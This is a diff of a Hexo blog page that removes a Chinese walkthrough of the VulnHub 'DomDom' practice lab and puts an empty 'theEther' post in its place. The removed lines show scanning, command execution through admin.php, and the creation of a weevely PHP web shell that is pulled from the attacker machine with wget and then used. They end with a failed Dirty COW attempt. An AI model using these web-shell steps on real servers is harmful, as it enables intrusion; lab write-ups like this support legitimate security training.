@@ -4,13 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="综合实战第三章-特殊抓包实战, Broken-year">
-    <meta name="description" content="综合实战第三章特殊抓包实战环境准备
-靶场下载：https://www.vulnhub.com/entry/domdom-1,328/
-攻击机:
-kali 192.168.3.134
-win7 192.168.3.137
-靶机:DomDom ">
+    <meta name="keywords" content="theEther, Broken-year">
+    <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -22,7 +17,7 @@ win7 192.168.3.137
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>综合实战第三章-特殊抓包实战 | Broken-year</title>
+    <title>theEther | Broken-year</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -314,12 +309,12 @@ win7 192.168.3.137
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">综合实战第三章-特殊抓包实战</h1>
+                    <h1 class="description center-align post-title">theEther</h1>
                 </div>
             </div>
         </div>
@@ -433,37 +428,12 @@ win7 192.168.3.137
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
-                                <span class="chip bg-color">网络安全</span>
-                            </a>
-                        
-                            <a href="/tags/%E7%BB%BC%E5%90%88%E5%AE%9E%E6%88%98/">
-                                <span class="chip bg-color">综合实战</span>
-                            </a>
-                        
-                            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                                <span class="chip bg-color">渗透测试</span>
-                            </a>
-                        
-                            <a href="/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
-                                <span class="chip bg-color">靶场练习</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" class="post-category">
-                                靶场练习
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -493,58 +463,7 @@ win7 192.168.3.137
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="综合实战第三章"><a href="#综合实战第三章" class="headerlink" title="综合实战第三章"></a>综合实战第三章</h1><h2 id="特殊抓包实战"><a href="#特殊抓包实战" class="headerlink" title="特殊抓包实战"></a>特殊抓包实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote>
-<p>靶场下载：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/domdom-1,328/">https://www.vulnhub.com/entry/domdom-1,328/</a></p>
-<p>攻击机:</p>
-<p>kali 192.168.3.134</p>
-<p>win7 192.168.3.137</p>
-<p>靶机:DomDom 192.168.3.172</p>
-</blockquote>
-<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>熟悉的nmap，熟悉的信息搜集</p>
-<pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.172
-</code></pre>
-<p><img src="/2022/05/03/DomDom/image-20220503151326941.png" alt="image-20220503151326941"></p>
-<p>开放80端口，打开网页看看</p>
-<p><img src="/2022/05/03/DomDom/image-20220503151435768.png" alt="image-20220503151435768"></p>
-<p>嗯抓包看看</p>
-<p><img src="/2022/05/03/DomDom/image-20220503153629826.png" alt="image-20220503153629826"></p>
-<p>也没啥东西</p>
-<p>扫描一下网站目录吧</p>
-<pre class=" language-Linux"><code class="language-Linux">dirsearch -u http://192.168.3.172
-</code></pre>
-<p><img src="/2022/05/03/DomDom/image-20220503154224197.png" alt="image-20220503154224197"></p>
-<p>看到有这些东西，去看看</p>
-<p><img src="/2022/05/03/DomDom/image-20220503154321032.png" alt="image-20220503154321032"></p>
-<p>这乍一看看不出啥，抓包看看</p>
-<p><img src="/2022/05/03/DomDom/image-20220503154618196.png" alt="image-20220503154618196"></p>
-<p>也没啥东西</p>
-<p>在主页面抓包，然后把<code>/index.php</code>改成<code>/admin.php</code>试试</p>
-<p>回显出东西了！</p>
-<p><img src="/2022/05/03/DomDom/image-20220503154812204.png" alt="image-20220503154812204"></p>
-<p>可以构造参数试试</p>
-<p><img src="/2022/05/03/DomDom/image-20220503154856250.png" alt="image-20220503154856250"></p>
-<p>确定可以命令执行</p>
-<h3 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h3><p>先制作一个木马文件</p>
-<pre class=" language-Linux"><code class="language-Linux">weevely generate 123456 /root/shell.php 
-</code></pre>
-<p>python打开http</p>
-<pre class=" language-Linux"><code class="language-Linux">python -m SimpleHTTPServer
-</code></pre>
-<p>然后构造语句</p>
-<pre class=" language-Linux"><code class="language-Linux">wget http://192.168.3.134:8000/shell.php
-</code></pre>
-<p><img src="/2022/05/03/DomDom/image-20220503155548896.png" alt="image-20220503155548896"></p>
-<p>上传</p>
-<p><img src="/2022/05/03/DomDom/image-20220503155607458.png" alt="image-20220503155607458"></p>
-<p>上传成功，接下来尝试连接</p>
-<pre class=" language-Linux"><code class="language-Linux">weevely http://192.168.3.172:8000/shell.php 123456
-</code></pre>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查看linux版本</p>
-<pre class=" language-Linux"><code class="language-Linux">uname -a 
-</code></pre>
-<p><img src="/2022/05/03/DomDom/image-20220503155907584.png" alt="image-20220503155907584"></p>
-<p>先下载个脏牛漏洞然后扔进去，我没成功</p>
-
+                
                 
             </div>
             <hr/>
@@ -570,7 +489,7 @@ win7 192.168.3.137
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Broken-year.github.io/2022/05/03/DomDom/">http://Broken-year.github.io/2022/05/03/DomDom/</a>
+                    <a href="http://Broken-year.github.io/2022/05/03/theEther/">http://Broken-year.github.io/2022/05/03/theEther/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -607,23 +526,7 @@ win7 192.168.3.137
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
-                                    <span class="chip bg-color">网络安全</span>
-                                </a>
-                            
-                                <a href="/tags/%E7%BB%BC%E5%90%88%E5%AE%9E%E6%88%98/">
-                                    <span class="chip bg-color">综合实战</span>
-                                </a>
-                            
-                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                                    <span class="chip bg-color">渗透测试</span>
-                                </a>
-                            
-                                <a href="/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
-                                    <span class="chip bg-color">靶场练习</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -795,9 +698,10 @@ win7 192.168.3.137
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2022/05/03/theEther/">
                     <div class="card-image">
@@ -815,9 +719,9 @@ win7 192.168.3.137
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-05-03
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-03
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -826,6 +730,7 @@ win7 192.168.3.137
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -836,13 +741,13 @@ win7 192.168.3.137
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/05/02/djinn/">
+                <a href="/2022/05/03/DomDom/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="综合实战第三章-异常端口实战">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="综合实战第三章-特殊抓包实战">
                         
-                        <span class="card-title">综合实战第三章-异常端口实战</span>
+                        <span class="card-title">综合实战第三章-特殊抓包实战</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -853,7 +758,7 @@ win7 192.168.3.137
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-02
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-03
                             </span>
                         <span class="publish-author">
                             
